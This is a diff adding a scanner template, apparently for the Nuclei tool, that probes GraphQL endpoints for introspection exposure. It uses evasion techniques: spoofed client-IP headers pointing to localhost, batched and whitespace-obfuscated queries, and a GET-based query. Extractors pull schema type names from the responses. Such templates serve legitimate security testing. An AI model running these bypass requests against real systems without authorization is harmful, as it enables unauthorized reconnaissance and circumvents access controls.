@@ -1,0 +1,162 @@
+id: medium-webapp-graphql-introspection-bypass
+
+info:
+  name: GraphQL Introspection Bypass - Elite Red Team
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced GraphQL introspection bypass using multiple evasion techniques.
+    Detects GraphQL endpoints that allow introspection queries despite security measures.
+    Uses header manipulation, query obfuscation, and batching techniques.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+    - https://portswigger.net/web-security/graphql
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-200
+  tags: graphql,introspection,bypass,information-disclosure,red-team
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+      - "{{BaseURL}}/v1/graphql"
+      - "{{BaseURL}}/v2/graphql"
+      - "{{BaseURL}}/query"
+      - "{{BaseURL}}/api/query"
+
+    headers:
+      Content-Type: application/json
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      CF-Connecting-IP: 127.0.0.1
+      True-Client-IP: 127.0.0.1
+      X-Apollo-Tracing: 1
+      Apollo-Query-Plan-Experimental: 1
+
+    body: |
+      {
+        "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "__schema"
+          - "queryType"
+          - "mutationType"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "Query"
+          - "Mutation"
+          - "__Type"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.data.__schema.types[].name'
+          - '.data.__schema.queryType.name'
+          - '.data.__schema.mutationType.name'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+      - "{{BaseURL}}/api/graphql"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (compatible; GraphQL-Playground)
+      X-Apollo-Tracing: 1
+
+    body: |
+      [
+        {
+          "query": "{ __schema { types { name } } }"
+        },
+        {
+          "query": "{ __type(name: \"Query\") { fields { name type { name } } } }"
+        }
+      ]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "__schema"
+          - "types"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+
+    headers:
+      Content-Type: application/json
+      X-Forwarded-Proto: https
+      X-Forwarded-Host: localhost
+
+    body: |
+      {
+        "query": "query { \n  __schema \n  { \n    types \n    { \n      name \n      fields \n      { \n        name \n        type \n        { \n          name \n        } \n      } \n    } \n  } \n}"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "__schema"
+          - "fields"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/graphql?query={__schema{types{name}}}"
+      - "{{BaseURL}}/api/graphql?query={__schema{types{name}}}"
+
+    headers:
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "__schema"
+          - "types"
+        condition: and
+
+      - type: status
+        status:
+          - 200
